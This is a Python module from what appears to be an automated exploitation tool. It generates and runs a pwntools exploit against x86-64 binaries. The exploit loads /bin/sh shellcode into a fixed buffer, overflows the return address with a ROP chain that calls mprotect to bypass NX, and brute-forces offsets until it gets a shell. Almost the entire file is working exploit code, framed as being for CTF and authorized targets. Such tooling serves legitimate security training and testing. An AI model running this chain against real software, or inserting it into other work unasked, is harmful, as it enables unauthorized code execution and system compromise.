"""mprotect()+shellcode ROP chain: bypass NX without needing a libc leak, verified by getting a
real shell in the sandbox.

Targets the common two-read CTF shape: one read stages attacker shellcode into a KNOWN,
page-aligned .bss/.data buffer (fixed address -- no-PIE, no leak needed), then a second,
overflowing read corrupts the return address with a ROP chain that calls the binary's own
`mprotect(buf, PAGE_SIZE, PROT_READ|WRITE|EXEC)` and jumps into the now-executable buffer. This
is the classic "ROP just far enough to turn NX off, then run real shellcode" technique -- useful
when the gadget set is too thin for a full ret2libc/execve chain but rich enough for three
register loads and a function call.

Needs `mprotect` to be a resolvable symbol in the binary (true for most statically linked
targets, since libc pulls it in transitively) and pwntools' automatic register-setting to find
a path to rdi/rsi/rdx with the gadgets on hand; otherwise this reports NOT_APPLICABLE rather than
guessing. For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_PAGE = 0x1000

_DRIVER = r'''
import sys, time
from pwn import ELF, ROP, context, p64, process, asm, shellcraft
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (mprotect driver is x86-64)"); sys.exit(1)

mprotect_addr = (elf.symbols or {}).get("mprotect")
if not mprotect_addr:
    print("NOT_APPLICABLE (no resolvable mprotect() symbol -- static link pulls it in; "
          "dynamic targets would need its PLT/GOT entry already bound)")
    sys.exit(1)

# staging buffer: a known, fixed-address .bss/.data symbol the FIRST read fills with shellcode
# (same "named fixed buffer" convention as the stack-pivot driver) -- must be page-sized/aligned
# enough that PAGE_SIZE bytes of shellcode fit and mprotect's addr argument is valid.
stage_addr = None
for cand in ("shellbuf", "shellcode_buf", "exec_buf", "stage", "buf"):
    if cand in (elf.symbols or {}):
        stage_addr = elf.symbols[cand]; break
if stage_addr is None:
    print("NOT_APPLICABLE (no known fixed shellcode-staging buffer symbol)")
    sys.exit(1)

rop = ROP(elf)
try:
    rop.rdx = 7   # PROT_READ | PROT_WRITE | PROT_EXEC
    rop.call(mprotect_addr, [stage_addr, PAGE])
except Exception as e:
    print("NOT_APPLICABLE (pwntools could not set rdi/rsi/rdx with the gadgets on hand: %s)" % e)
    sys.exit(1)
chain = rop.chain()

shellcode = asm(shellcraft.sh()).ljust(PAGE, b"\x90")
MARK = b"BINORACLE_MPROTECT_PWNED"

def attempt(off, extra_pad):
    overflow = b"A" * off + b"B" * extra_pad + chain + p64(stage_addr)
    io = None
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(shellcode)          # stage 1: shellcode into the known buffer
        time.sleep(0.1)
        io.send(overflow)           # stage 2: overflow -> mprotect(buf) + jump to buf
        time.sleep(0.25)
        io.sendline(b"echo " + MARK + b"; id")
        time.sleep(0.35)
        out = b""
        try: out = io.recvrepeat(1.1)
        except Exception: pass
        io.close()
        return (MARK in out) or (b"uid=" in out)
    except Exception:
        try:
            if io: io.close()
        except Exception: pass
        return False

for off in [64, 72, 56, 80, 40, 88, 32, 96, 104, 24, 112, 128]:
    for extra_pad in (8, 0):   # 8: leave;ret frame (saved rbp slot); 0: bare ret-only frame
        if attempt(off, extra_pad):
            print("VERIFIED off=%d extra_pad=%d mprotect=%#x stage=%#x"
                  % (off, extra_pad, mprotect_addr, stage_addr))
            sys.exit(0)
print("NOT_VERIFIED")
sys.exit(1)
'''.replace("PAGE", str(_PAGE))


def autoropmprotect(binary: str) -> dict:
    """ROP a mprotect() call para quitar NX de un buffer fijo conocido y saltar a shellcode
    real, verificado por ejecucion (shell de verdad). Necesita el simbolo `mprotect` resoluble
    y un buffer .bss/.data de nombre conocido donde el primer read() deja el shellcode."""
    res = run_driver(binary, _DRIVER, ".binoracle_mprotect.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"mprotect()+shellcode (bypass NX sin leak): shell verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"mprotect()+shellcode: no verificado ({eng}) (sin mprotect()/buffer fijo "
                        f"conocido, gadgets insuficientes para rdi/rsi/rdx, o forma de entrada distinta)")
    return res


def render_ropmprotect(r: dict) -> str:
    out = ["## Auto ROP mprotect()+shellcode (bypass NX, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
